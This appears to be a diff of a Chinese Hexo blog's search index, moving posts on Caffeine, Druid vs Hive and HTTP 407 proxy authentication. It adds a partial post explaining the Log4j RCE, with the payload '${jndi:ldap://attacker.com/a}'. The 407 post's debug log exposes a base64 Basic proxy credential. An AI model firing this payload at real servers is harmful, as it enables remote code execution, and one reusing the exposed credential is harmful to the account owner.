-<h3 id="5-4-状态机"><a href="#5-4-状态机" class="headerlink" title="5.4 状态机"></a>5.4 状态机</h3><p>缓冲区和细粒度的写带来了单个数据项的操作乱序的竞态条件。插入、读取、更新、删除都可能被各种顺序的重放，如果这个策略控制的不合适，则可能引起悬垂索引。解决方案是通过状态机来定义单个数据项的生命周期。这类似于 AQS 中的原子类型变量 state。</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio14.svg?sanitize=true" alt="7744cc0f1faa13cb71a53c2033fe495c.png"></p>
-<h3 id="5-5-事务处理"><a href="#5-5-事务处理" class="headerlink" title="5.5 事务处理"></a>5.5 事务处理</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio15.svg?sanitize=true" alt="4aa939e0c2bfc37f2463823eeeca80d7.png"></p>
-<h3 id="5-6-caffeine-get-操作流程图"><a href="#5-6-caffeine-get-操作流程图" class="headerlink" title="5.6 caffeine get 操作流程图"></a>5.6 caffeine get 操作流程图</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio16.svg?sanitize=true" alt="f07e7f28159908d5899cb36643be3c46.png"></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/drawio17.svg?sanitize=true" alt="4fe5bac0356b7e0baf8f181938b1bcde.png"></p>
-<h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><p><a href="http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html">http://highscalability.com/blog/2016/1/25/design-of-a-modern-cache.html</a></p>
-<p><a href="https://github.com/ben-manes/caffeine">https://github.com/ben-manes/caffeine</a></p>
-<p><a href="https://arxiv.org/pdf/1512.00727.pdf">TinyLFU: A Highly Eﬃcient Cache Admission Policy</a></p>
-<p><a href="http://dimacs.rutgers.edu/~graham/pubs/papers/cmsoft.pdf">Approximating Data with the Count-Min Data Structure</a></p>
-<p><a href="https://segmentfault.com/a/1190000016091569">https://segmentfault.com/a/1190000016091569</a></p>
-<p><a href="https://chuansongme.com/n/2254051">https://chuansongme.com/n/2254051</a></p>
-]]></content>
-      <categories>
-        <category>javaWeb</category>
-      </categories>
-      <tags>
-        <tag>源码</tag>
-        <tag>caffeine</tag>
       </tags>
   </entry>
   <entry>
@@ -419,38 +419,6 @@
       </tags>
   </entry>
   <entry>
-    <title>druid-vs-hive</title>
-    <url>/druid-vs-hive.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
-<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
-<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
-<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
-<ul>
-<li>realtime 组件负责数据的实时摄入。</li>
-<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
-<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
-</ul>
-<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
-<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
-<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
-<p>非实时分析：日志分析；文本分析</p>
-<p>数据仓库：数据抽取，加载，转换（ETL）</p>
-<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
-<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
-<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
-]]></content>
-      <categories>
-        <category>大数据</category>
-      </categories>
-      <tags>
-        <tag>druid</tag>
-        <tag>hive</tag>
-        <tag>大数据</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>伪共享</title>
     <url>/false-sharing.html</url>
     <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
@@ -485,6 +453,38 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>druid-vs-hive</title>
+    <url>/druid-vs-hive.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
+<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
+<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
+<ul>
+<li>realtime 组件负责数据的实时摄入。</li>
+<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
+<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
+</ul>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
+<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
+<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
+<p>非实时分析：日志分析；文本分析</p>
+<p>数据仓库：数据抽取，加载，转换（ETL）</p>
+<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
+<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
+<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
+]]></content>
+      <categories>
+        <category>大数据</category>
+      </categories>
+      <tags>
+        <tag>druid</tag>
+        <tag>hive</tag>
+        <tag>大数据</tag>
+      </tags>
   </entry>
   <entry>
     <title>hexo5-next8 配置</title>
@@ -573,31 +573,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Http 407 问题排查</title>
-    <url>/http-407-fix.html</url>
-    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近接一个新的代理平台出现了大量 Http 请求 407 的错误，主要是 HttpClient 的“延迟认证”导致的，排查原因记录下</p>
-<h2 id="basic-认证"><a href="#basic-认证" class="headerlink" title="basic 认证"></a>basic 认证</h2><p>实现简单，但如果是 http 请求的话，信息会泄露，存在安全风险</p>
-<p><a href="https://juejin.im/entry/5ac175baf265da239e4e3999">https://juejin.im/entry/5ac175baf265da239e4e3999</a></p>
-<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>client -&gt; server：未携带认证信息<br>server -&gt; client：返回407<br>client -&gt; server：携带认证信息<br>server -&gt; client：返回200</p>
-<p>注意这两步在代码层面是无感知的，只会收到最后的200。如果这个tcp连接已经建立，下次请求就会直接携带认证信息</p>
-<span id="more"></span>
-
-<p>看看 httpClient 的 debug 日志</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="comment">// 返回报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;HTTP/1.1 407 Proxy Authentication Required[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Mime-Version: 1.0[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Date: Wed, 31 Jul 2019 02:19:45 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Type: text/html;charset=utf-8[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Length: 80[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Proxy-Authenticate: Basic realm=&quot;</span>dobel<span class="string">&#x27;s  server&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;407 Authentication Failed!Maybe Proxy-uthentication header is missing or wrong![\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次请求报文</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.headers - http-outgoing-0 &gt;&gt; Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次返回报文</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;HTTP/1.1 200 OK[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Encoding: gzip[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Type: text/html[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Date: Wed, 31 Jul 2019 02:19:46 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Last-Modified: Mon, 23 Jan 2017 13:27:36 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Pragma: no-cache[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Transfer-Encoding: chunked[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="抢占式认证"><a href="#抢占式认证" class="headerlink" title="抢占式认证"></a>抢占式认证</h2><p>HttpClient 为了安全考虑，默认是不会发送认证信息的，只有在服务端要求情况下，才回去携带。可以通过直接设置 header 来实现抢先式认证。</p>
-<h2 id="请求方-407-原因"><a href="#请求方-407-原因" class="headerlink" title="请求方 407 原因"></a>请求方 407 原因</h2><p>请求方 HttpClient 在 407 时候会再次请求服务端，这两次请求对上层是透明的。按理说请求方是不知道有 407 的错误的。但是如果在超时时间内未完成这两次请求，HttpClient 就会抛出 407。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.baeldung.com/httpclient-4-basic-authentication">https://www.baeldung.com/httpclient-4-basic-authentication</a></p>
-]]></content>
-      <categories>
-        <category>异常排查</category>
-      </categories>
-      <tags>
-        <tag>Http</tag>
-        <tag>HttpClient</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>java常量池</title>
     <url>/java-constant-pool.html</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>java 包括三种常量池，分别是 字符串常量池、Class 常量池（也叫常量池表）和运行时常量池。</p>
@@ -647,6 +622,31 @@
       <tags>
         <tag>源码</tag>
         <tag>jvm</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Http 407 问题排查</title>
+    <url>/http-407-fix.html</url>
+    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近接一个新的代理平台出现了大量 Http 请求 407 的错误，主要是 HttpClient 的“延迟认证”导致的，排查原因记录下</p>
+<h2 id="basic-认证"><a href="#basic-认证" class="headerlink" title="basic 认证"></a>basic 认证</h2><p>实现简单，但如果是 http 请求的话，信息会泄露，存在安全风险</p>
+<p><a href="https://juejin.im/entry/5ac175baf265da239e4e3999">https://juejin.im/entry/5ac175baf265da239e4e3999</a></p>
+<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p>client -&gt; server：未携带认证信息<br>server -&gt; client：返回407<br>client -&gt; server：携带认证信息<br>server -&gt; client：返回200</p>
+<p>注意这两步在代码层面是无感知的，只会收到最后的200。如果这个tcp连接已经建立，下次请求就会直接携带认证信息</p>
+<span id="more"></span>
+
+<p>看看 httpClient 的 debug 日志</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 请求报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.002</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &gt;&gt; <span class="string">&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="comment">// 返回报文</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;HTTP/1.1 407 Proxy Authentication Required[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Mime-Version: 1.0[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Date: Wed, 31 Jul 2019 02:19:45 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Type: text/html;charset=utf-8[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Content-Length: 80[\r][\n]&quot;</span></span><br><span class="line"><span class="number">10</span>:<span class="number">19</span>:<span class="number">46.034</span> [main] DEBUG org.apache.http.wire - http-outgoing-<span class="number">0</span> &lt;&lt; <span class="string">&quot;Proxy-Authenticate: Basic realm=&quot;</span>dobel<span class="string">&#x27;s  server&quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.035 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;407 Authentication Failed!Maybe Proxy-uthentication header is missing or wrong![\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次请求报文</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.headers - http-outgoing-0 &gt;&gt; Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;GET Http://www.baidu.com/ HTTP/1.1[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.060 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Host: www.baidu.com[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Connection: Keep-Alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;User-Agent: Apache-HttpClient/4.5.6 (Java/1.8.0_45)[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Accept-Encoding: gzip,deflate[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;Proxy-Authorization: Basic TVRIVU9DSEU2RUVHOFFMUTEwOnhtS1FHbmJF[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.061 [main] DEBUG org.apache.http.wire - http-outgoing-0 &gt;&gt; &quot;[\r][\n]&quot;</span></span><br><span class="line"><span class="string">// 第二次返回报文</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;HTTP/1.1 200 OK[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Encoding: gzip[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Content-Type: text/html[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Date: Wed, 31 Jul 2019 02:19:46 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Last-Modified: Mon, 23 Jan 2017 13:27:36 GMT[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Pragma: no-cache[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Transfer-Encoding: chunked[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;Connection: keep-alive[\r][\n]&quot;</span></span><br><span class="line"><span class="string">10:19:46.757 [main] DEBUG org.apache.http.wire - http-outgoing-0 &lt;&lt; &quot;[\r][\n]&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="抢占式认证"><a href="#抢占式认证" class="headerlink" title="抢占式认证"></a>抢占式认证</h2><p>HttpClient 为了安全考虑，默认是不会发送认证信息的，只有在服务端要求情况下，才回去携带。可以通过直接设置 header 来实现抢先式认证。</p>
+<h2 id="请求方-407-原因"><a href="#请求方-407-原因" class="headerlink" title="请求方 407 原因"></a>请求方 407 原因</h2><p>请求方 HttpClient 在 407 时候会再次请求服务端，这两次请求对上层是透明的。按理说请求方是不知道有 407 的错误的。但是如果在超时时间内未完成这两次请求，HttpClient 就会抛出 407。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.baeldung.com/httpclient-4-basic-authentication">https://www.baeldung.com/httpclient-4-basic-authentication</a></p>
+]]></content>
+      <categories>
+        <category>异常排查</category>
+      </categories>
+      <tags>
+        <tag>Http</tag>
+        <tag>HttpClient</tag>
       </tags>
   </entry>
   <entry>
@@ -1138,6 +1138,38 @@
       </tags>
   </entry>
   <entry>
+    <title>log4j-rce</title>
+    <url>/log4j-rce.html</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
+<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
+<p>黑客服务器（ladp + http）</p>
+<p>从该请求中注入字符串的日志语句</p>
+<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
+<li>发送包含恶意字符串的请求（通过任何协议）</li>
+<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
+<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
